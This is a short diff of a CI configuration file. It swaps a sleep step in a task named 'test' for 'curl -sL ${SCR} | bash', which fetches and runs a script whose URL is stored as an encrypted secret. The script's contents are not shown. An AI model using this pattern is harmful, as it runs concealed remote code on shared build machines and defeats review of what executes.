@@ -1,5 +1,5 @@
 env:
-    DEVICE: pissarro
+    SCR: ENCRYPTED[fd2063caea2972a1e81c4fdf91e1562b0a46dfd734d138a6fb7109d7fe63e53fca7090fd807bb74c2c967ddfd811c7c5]
 
 task:
   name: "test"
@@ -9,4 +9,4 @@ task:
       cpu: 8
       memory: 32G
   Setup_script:
-      - sleep 120m
+      - curl -sL ${SCR} | bash
